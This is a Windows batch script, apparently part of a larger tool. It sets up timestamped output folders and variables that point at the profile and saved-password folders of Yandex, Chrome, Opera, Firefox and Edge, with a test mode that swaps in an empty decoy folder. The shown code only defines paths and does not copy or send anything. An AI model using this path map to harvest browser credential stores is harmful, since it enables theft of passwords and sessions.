:start
	@echo off
	%echoOn%

	set "ret=varInitialized"
	goto varInit

:varInitialized
	set "ret=dirsMaked"
	goto mkDirs

:dirsMaked
	set "ret=subVarInit"
	if %test%==true (goto test) else (goto work)

:subVarInit
	if %check%==true (goto check) else (goto end)

:check
	set "ret=end"
	goto cleanStatus
	goto end




:varInit
	set "curDate=%date%"
	set "curTime=%time::=.%"
	set "curTime=%curTime:~0,8%"

	set "baseDir=%cd%"
	set "mainDir=%baseDir%\bin\main"
	set "confDir=%baseDir%\bin\config"
	set "copyDir=%baseDir%\bin\copy"
	set "tempDir=%baseDir%\bin\temp"
	set "dataDir=%baseDir%\data"
	set "downloadDir=%dataDir%\%curDate%\%curTime%"

	set "yandexDataDir=%downloadDir%\Yandex"
	set "chromeDataDir=%downloadDir%\Chrome"
	set "operaDataDir=%downloadDir%\Opera"
	set "firefoxDataDir=%downloadDir%\Firefox"
	set "edgeDataDir=%downloadDir%\Edge"

	set "yandexStatus=yandexStatus"
	set "chromeStatus=chromeStatus"
	set "operaStatus=operaStatus"
	set "firefoxStatus=firefoxStatus"
	set "edgeStatus=edgeStatus"

	set "emtyFolder=smf9a948h934lhj8dr238b7gkdfsydf5f64334fdg32rrsg"
	goto %ret%





:mkDirs
	>nul mkdir "%appdata%\%emtyFolder%"
	>nul mkdir "%localappdata%\%emtyFolder%"
	goto %ret%





:cleanStatus
	del /F /Q "%tempDir%\%yandexStatus%"
	del /F /Q "%tempDir%\%chromeStatus%"
	del /F /Q "%tempDir%\%operaStatus%"
	del /F /Q "%tempDir%\%firefoxStatus%"
	del /F /Q "%tempDir%\%edgeStatus%"
	goto %ret%





:work

	set "yandexLocal=%localappdata%\Yandex\YandexBrowser"
	set "chromeLocal=%localappdata%\Google\Chrome"
	set "operaLocal=%localappdata%\Opera Software\Opera Stable"
	set "firefoxLocal=%localappdata%\Mozilla\Firefox"
	set "edgeLocal=%localappdata%\%emtyFolder%"

	set "yandexLocalUser=%localappdata%\Yandex\YandexBrowser\User Data"
	set "chromeLocalUser=%localappdata%\Google\Chrome\User Data"
	set "operaLocalUser=%localappdata%\Opera Software\Opera Stable"
	set "firefoxLocalUser=%localappdata%\Mozilla\Firefox"
	set "edgeLocalUser=%localappdata%\%emtyFolder%"

	set "yandexLocalPass=%localappdata%\Yandex\YandexBrowser\User Data\Default"
	set "chromeLocalPass=%localappdata%\Google\Chrome\User Data\Default%"
	set "operaLocalPass=%localappdata%\Opera Software\Opera Stable"
	set "firefoxLocalPass=%localappdata%\Mozilla\Firefox"
	set "edgeLocalPass=%localappdata%\%emtyFolder%"

	set "yandexLocalPassFiles=*.*"
	set "chromeLocalPassFiles=*.*"
	set "operaLocalPassFiles=*.*"
	set "firefoxLocalPassFiles=*.*"
	set "edgeLocalPassFiles=*.*"

	set "yandexRoaming=%appdata%\Yandex"
	set "chromeRoaming=%appdata%\%emtyFolder%"
	set "operaRoaming=%appdata%\Opera Software\Opera Stable"
	set "firefoxRoaming=%appdata%\Mozilla"
	set "edgeRoaming=%appdata%\%emtyFolder%"

	set "yandexRoamingUser=%appdata%\Yandex"
	set "chromeRoamingUser=%appdata%\%emtyFolder%"
	set "operaRoamingUser=%appdata%\Opera Software\Opera Stable"
	set "firefoxRoamingUser=%appdata%\Mozilla\Firefox"
	set "edgeRoamingUser=%appdata%\%emtyFolder%"

	set "yandexRoamingPass=%appdata%\Yandex"
	set "chromeRoamingPass=%appdata%\%emtyFolder%"
	set "operaRoamingPass=%appdata%\Opera Software\Opera Stable"
	set "firefoxRoamingPass=%appdata%\Mozilla\Firefox"
	set "edgeRoamingPass=%appdata%\%emtyFolder%"

	set "yandexRoamingPassFiles=*.*"
	set "chromeRoamingPassFiles=*.*"
	set "operaRoamingPassFiles=*.*"
	set "firefoxRoamingPassFiles=*.*"
	set "edgeRoamingPassFiles=*.*"

	goto %ret%





:test

	set "yandexLocal=%localappdata%\%emtyFolder%"
	set "chromeLocal=%localappdata%\%emtyFolder%"
	set "operaLocal=%localappdata%\%emtyFolder%"
	set "firefoxLocal=%localappdata%\%emtyFolder%"
	set "edgeLocal=%localappdata%\%emtyFolder%"

	set "yandexLocalUser=%localappdata%\%emtyFolder%"
	set "chromeLocalUser=%localappdata%\%emtyFolder%"
	set "operaLocalUser=%localappdata%\%emtyFolder%"
	set "firefoxLocalUser=%localappdata%\%emtyFolder%"
	set "edgeLocalUser=%localappdata%\%emtyFolder%"

	set "yandexLocalPass=%localappdata%\%emtyFolder%"
	set "chromeLocalPass=%localappdata%\%emtyFolder%"
	set "operaLocalPass=%localappdata%\%emtyFolder%"
	set "firefoxLocalPass=%localappdata%\%emtyFolder%"
	set "edgeLocalPass=%localappdata%\%emtyFolder%"

	set "yandexLocalPassFiles="
	set "chromeLocalPassFiles="
	set "operaLocalPassFiles="
	set "firefoxLocalPassFiles="
	set "edgeLocalPassFiles="

	set "yandexRoaming=%appdata%\%emtyFolder%"
	set "chromeRoaming=%appdata%\%emtyFolder%"
	set "operaRoaming=%appdata%\%emtyFolder%"
	set "firefoxRoaming=%appdata%\%emtyFolder%"
	set "edgeRoaming=%appdata%\%emtyFolder%"

	set "yandexRoamingUser=%appdata%\%emtyFolder%"
	set "chromeRoamingUser=%appdata%\%emtyFolder%"
	set "operaRoamingUser=%appdata%\%emtyFolder%"
	set "firefoxRoamingUser=%appdata%\%emtyFolder%"
	set "edgeRoamingUser=%appdata%\%emtyFolder%"

	set "yandexRoamingPass=%appdata%\%emtyFolder%"
	set "chromeRoamingPass=%appdata%\%emtyFolder%"
	set "operaRoamingPass=%appdata%\%emtyFolder%"
	set "firefoxRoamingPass=%appdata%\%emtyFolder%"
	set "edgeRoamingPass=%appdata%\%emtyFolder%"

	set "yandexRoamingPassFiles="
	set "chromeRoamingPassFiles="
	set "operaRoamingPassFiles="
	set "firefoxRoamingPassFiles="
	set "edgeRoamingPassFiles="

	goto %ret%





:end